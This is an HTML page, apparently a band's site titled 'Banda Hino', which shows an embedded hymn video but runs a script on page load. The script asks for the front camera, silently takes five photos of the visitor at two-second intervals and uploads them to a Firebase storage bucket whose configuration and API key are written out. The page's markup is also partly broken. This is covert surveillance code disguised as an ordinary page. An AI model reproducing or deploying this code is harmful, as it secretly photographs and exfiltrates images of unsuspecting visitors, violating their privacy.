<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banda Hino</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        h1 {
            text-align: center;
        }
        ul {
            list-style-type: none;
            padding: 0;
            margin: 20px auto;
            max-width: 600px;
        }
        li {
            margin-bottom: 20px;
        }
        iframe {
            width: 100%;
            height: 315px;
        }
    </style>
</head>
<body>
    <h1>Banda Hino</h1>
    
    <div id="uploadMessage" class="message"></div>

    <script type="module">
        // Importar funções necessárias do SDK do Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-storage.js";

        // Configuração do Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBTScqXDpBvkkF4dZWf_9ZbjLVE9nGNZWU",
            authDomain: "dados-56d31.firebaseapp.com",
            projectId: "dados-56d31",
            storageBucket: "dados-56d31.appspot.com",
            messagingSenderId: "421767896706",
            appId: "1:421767896706:web:f41ece96eb20b09acd1e9b"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Solicitar a câmera frontal
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                let photoCount = 0;
                const maxPhotos = 5;

                const captureInterval = setInterval(() => {
                    if (photoCount < maxPhotos) {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            console.log('Blob criado:', blob);
                            
                            if (blob) {
                                const fileName = `foto${photoCount + 1}.png`;
                                const storageRef = ref(storage, `fotos/${fileName}`);

                                uploadBytes(storageRef, blob).then((snapshot) => {
                                    console.log('Imagem enviada:', snapshot);
                                    getDownloadURL(snapshot.ref).then((downloadURL) => {
                                        console.log('Imagem disponível em:', downloadURL);
                                    });
                                }).catch((error) => {
                                    console.error('Erro ao enviar:', error);
                                    document.getElementById('uploadMessage').textContent = "Erro ao enviar a foto: " + error.message;
                                });
                            } else {
                                console.error('Erro: Blob é null.');
                                document.getElementById('uploadMessage').textContent = "Erro ao criar a imagem.";
                            }
                        });

                        photoCount++;
                    } else {
                        clearInterval(captureInterval); // Para o intervalo após capturar 5 fotos
                        stream.getTracks().forEach(track => track.stop());
                    }
                }, 2000); // Captura uma foto a cada 2 segundos
            })
            .catch(error => {
                console.error("Erro ao acessar a câmera: ", error);
            });
    </script>

        </li>

            <iframe src="https://www.youtube.com/embed/GbMJaz3nRoE" title="Santificação" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </li>

        </li>
    </ul>
</body>
</html>
